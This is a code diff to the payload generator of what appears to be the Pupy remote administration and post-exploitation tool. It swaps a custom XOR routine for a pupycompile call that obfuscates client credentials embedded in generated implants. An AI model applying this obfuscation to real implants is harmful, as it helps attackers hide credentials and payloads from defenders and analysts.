@@ -11,6 +11,7 @@ from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinu
 from pupylib.payloads.rubber_ducky import rubber_ducky
 from pupylib.utils.obfuscate import compress_encode_obfs
 from pupylib.PupyConfig import PupyConfig
+from pupylib.PupyCompile import pupycompile
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
@@ -75,12 +76,6 @@ def get_edit_binary(path, conf, compressed_config=True):
     binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
     return binary
 
-def to_pye(data):
-    output = bytearray(len(data))
-    for i,x in enumerate(data):
-        output[i] = (ord(x)^((2**((65535-i)%65535))%251))
-    return output
-
 def get_raw_conf(conf, obfuscate=False, verbose=False):
     credentials = Credentials(role='client')
 
@@ -119,10 +114,10 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
         colorize("[+] ", "green") + ', '.join(required_credentials)
     )
 
-    embedded_credentials = compile('\n'.join([
+    embedded_credentials = '\n'.join([
         '{}={}'.format(credential, repr(credentials[credential])) \
         for credential in required_credentials if credentials[credential] is not None
-    ])+'\n', '<cs>', 'exec')
+    ])+'\n'
 
     if verbose:
         for k, v in conf.iteritems():
@@ -134,7 +129,7 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
     config = '\n'.join([
         'pupyimporter.pupy_add_package({})'.format(
             repr(cPickle.dumps({
-                'pupy_credentials.pye' : ('\0'*8) + to_pye(marshal.dumps(embedded_credentials))
+                'pupy_credentials.pye' : pupycompile(embedded_credentials, obfuscate=True)
             }))),
         dependencies.importer(set(
             'network.transports.{}'.format(transport) for transport in transports_list
